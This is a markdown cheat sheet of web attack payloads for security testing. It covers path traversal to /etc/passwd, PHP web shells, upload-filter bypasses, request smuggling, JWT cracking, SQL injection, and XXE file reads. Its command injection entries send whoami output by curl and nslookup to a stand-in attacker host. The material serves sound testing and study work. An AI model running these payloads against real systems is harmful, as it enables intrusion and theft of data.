# Quick Reference
Quick references for payloads and syntax when testing different types of attack.

## Cross-Site Scripting
### Links
* [XSS Injection - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
* [Burp XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 


## Directory Traversal
### Filter Evasion Techniques
|Technique|Example (../../../etc/passwd)|
|---|---|
|Nested Traveral|`....//....//....//etc/passwd` (`....\/` for Windows)|
|URL Encoding|`%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`|
|Double URL Encoding|`%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`|
|Start Of Path|`/var/www/images/../../../etc/passwd`|
|Null Byte Bypass|`../../../etc/passwd%00.png`|

### Links
* [File Inclusion - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
* [Directory Traversal - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)


## DOM-Based Vulnerabilities
### Common Sources
* `document.URL`
* `document.documentURI`
* `document.URLUnencoded`
* `document.baseURI`
* `location`
* `document.cookie`
* `document.referrer`
* `window.name`
* `history.pushState`
* `history.replaceState`
* `localStorage`
* `sessionStorage`
* `IndexedDB` (`mozIndexedDB`, `webkitIndexedDB`, `msIndexedDB`)
* `Database`

### Common Sinks and Vulnerabilities
|Vulnerability|Sink|
|---|---|
|[DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)|`document.write()`|
|[Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)|`window.location`|
|[Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation) |`document.cookie`|
|[JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)|`eval()`|
|[Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)|`document.domain`|
|[WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)|`WebSocket()`|
|[Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)||`element.src`|
|[Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)|`postMessage()`|
|[Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)|`setRequestHeader()`|
|[Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)|`FileReader.readAsText()`|
|[Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)|`ExecuteSql()`|
|[HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)|`sessionStorage.setItem()`|
|[Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)|`document.evaluate()`|
|[Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)|`JSON.parse()`|
|[DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)|`element.setAttribute()`|
|[Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)|`RegExp()`|

### Links
* [XSS Injection - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)


## File Upload Vulnerabilities
### Common Shells
|PHP Snippet|Functionality|
|---|---|
|`<?php echo file_get_contents('/path/to/file'); ?>`|Read a file on the filesystem.|
|`<?php echo system($_GET['c']); ?>`|Execute a system command specified by the `c` GET parameter.|

### File Extension Obfuscation
* `exploit.pHp`
* `exploit.php.jpg`
* `exploit.php.`
* `exploit%2Ephp`
* `exploit.php;.jpg` or `exploit.php%00.jpg
* `exploit.p.phphp`

### Override Config Files
`.htaccess` file which allows files with the extension `.l33t` to be executed as PHP:
```config
AddType application/x-httpd-php .l33t
```

`web.config` file which allows JSON to be served to users:
```config
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```

### Links
* [Upload Insecure Files - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)


## HTTP Headers
|Header|Description|
|---|---|
|`Accept`|Informs the server about the types of data that can be sent back.|
|`Access-Control-Allow-Credentials`|Indicates whether the response to the request can be exposed when the credentials flag is true.|
|`Access-Control-Allow-Origin`|A CORS header which specifies whether the response can be shared.|
|`Authorization`|Contains credentials to authenticate with a server.|
|`Content-Security-Policy`|Controls resources the user is allowed to load for a given page.|
|`Content-Type`|Media type of the resource.|
|`Cookie`|Contains stored HTTP cookies.|
|`Cross-Origin-Resource-Policy`|Prevents other domains from reading the response of the resources which this header is applied.|
|`Forwarded`|The domain name of the server (alternative to `Host`).|
|`Host`|The domain name of the server.|
|`Location`|Indicated the URL to redirect a page to.|
|`Origin`|Origin of the request.|
|`Pragma`|Specific header which causes effects anywhere along the request chain (caching).|
|`Referer`|The address of the previous web page from which the request was made.|
|`TE`|Specifies the transfer encodings the user is willing to accept.|
|`Transfer-Encoding`|Specifies the form of encoding to use when transferring resources.|
|`Upgrade`|Allows the server or client to upgrade or change the connection protocol.|
|`Upgrade-Insecure-Requests`|Tells the server the user's preference for an encrypted response.|
|`X-Forwarded-For`|The originating IP address.|
|`X-Forwarded-Host`|The domain name of the server (`Host` header sent to proxy).|
|`X-Forwarded-Server`|The domain name of the server (alternative to `Host`).|
|`X-Frame-Options`|Indicated whether a browser should be allowed to render a page in an `<iframe>`|
|`X-Host`|The domain name of the server (alternative to `Host`).|
|`X-HTTP-Host-Override`|Overrides the `Host` header.|

### Links
* [Mozilla Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)

## HTTP Host Header Attacks
### Headers Which Specify The Server Host
- `Host`
- `X-Forwarded-Host`  
- `X-Host`
- `X-Forwarded-Server`
- `X-HTTP-Host-Override`
- `Forwarded`

### Useful Links
* 


## HTTP Request Smuggling
### Obfuscating The Transfer-Encoding Header
* `Transfer-Encoding: xchunked 
* `Transfer-Encoding : chunked`
* `Transfer-Encoding: chunked`<br>`Transfer-Encoding: x`
* `Transfer-Encoding:[tab]chunked`
* `[space]Transfer-Encoding: chunked`
* `X: X[\n]Transfer-Encoding: chunked`
* `Transfer-Encoding`<br>`: chunked`

### Useful Links
* [Request Smuggling - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling)


## JWT Attacks
### Hashcat Brute Force JWT Secret
`hashcat -a 0 -m 16500 <jwt> <wordlist>`

### Useful Links
* [JSON Web Token - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)


## OAuth Authentication 
### Configuration Endpoints
* `/.well-known/oauth-authorization-server`
* `/.well-known/openid-configuration`

### Useful Links
* [OAuth - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth)
* [Open Redirect - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)


## OS Command Injection
### Command Separators
|Separator|Operating System|
|---|---|
|`&`|Unix/Windows|
|`&&`|Unix/Windows|
|<code>&#124;</code>|Unix/Windows|
|<code>&#124;&#124;</code>|Unix/Windows|
|`;`|Unix|
|`\n` or `0x0a`|Unix|
|<code>&#96;*command*&#96;</code>|Unix|
|<code>$(*command*)</code>|Unix|

### Detecting Blind Attacks
* **Time Delays** - `& ping -c 10 127.0.0.1 &`
* **DNS Request** - `& nslookup kgji2ohoyw.web-attacker.com &`
* **HTTP Request** - `& curl kgji2ohoyw.web-attacker.com &`

### Blind Attack Payloads
* **Redirected Output** - ` & whoami > /var/www/static/whoami.txt &`
* **DNS Request** - ```& nslookup `whoami`.kgji2ohoyw.web-attacker.com &```
* **HTTP Request** - ```& curl `whoami`.kgji2ohoyw.web-attacker.com &```

### Useful Commands
|Function|Linux|Windows|
|---|---|---|
|Name of current user|`whoami`|`whoami`|
|Operating system|`uname -a`|`ver`|
|Network configuration|`ifconfig`|`ipconig /all`|
|Network connections|`netstat -an`|`netstat -an`|
|Running processes|`ps -ef`|`tasklist`|

### Useful Links
* [Command Injection - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)


## Server-Side Request Forgery
### Evading Input Filters
|Technique|Example|
|---|---|
|Embedded Credentials|`https://expected-host@evil-host`|
|URL Fragmenting|`https://evil-host#expected-host`|
|DNS  Hierarchy Abuse|`https://expected-host.evil-host`|

### Alternatives To localhost
* `127.0.0.1`
* `127.1`
* `2130706433`
* `017700000001`
*  `0x7f000001`
* `spoofed.burpcollaborator.net`

### Useful Links
* [Server Side Request Forgery - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
* [Open Redirect - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)


## Server-Side Template Injection
### Useful Links
* [Server Side Template Injection - Payloads]


## SQL Injection
### Comments
|Database Type|Command|
|---|---|
|Oracle|`--comment`|
|Microsoft|`--comment` or `/*comment*/`|
|PostgreSQL|`--comment` or `/*comment*/`|
|MySQL|`#comment`, `-- comment` or `/*comment*/`|

### Database Version
|Database Type|Command|
|----|----|
|Microsoft, MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

### Database Tables
|Database Type|Command|
|----|----|
|Non-Oracle|`SELECT * FROM information_schema.tables`|
|Oracle|`SELECT * FROM all_tables`|

### Database Columns
|Database Type|Command|
|----|----|
|Non-Oracle|`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`|
|Oracle|`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`|

### Time Delays
|Database Type|Command|
|----|----|
|Oracle|`dbms_pipe.receive_message(('a'),10)`|
|Microsoft|`WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT pg_sleep(10)`|
|MySQL|`SELECT SLEEP(10)`|

### DNS Queries
|Database Type|Command|
|---|---|
|Oracle (Exploit)|`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
|Oracle (Admin)|`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`|
|Microsoft|`exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`|
|PostgreSQL|`copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`|
|MySQL (Windows)|`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`<br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`|

### Useful Links
* [SQL Injection - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
* [Burp SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


## Web Cache Poisoning
### Header To Reveal Cache Information
`Pragma: x-get-cache-key`

### Useful Links
* [Web Cache Deception - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Deception)


## WebSockets
### Useful Links
* [Web Sockets - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Sockets)


## XML External Entity Injection
### File Retrieval
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
	<productId>&xxe;</productId>
</stockCheck>
```

### Retrieving Data Via Error Messages
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### Useful Links
* [XXE Injection - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)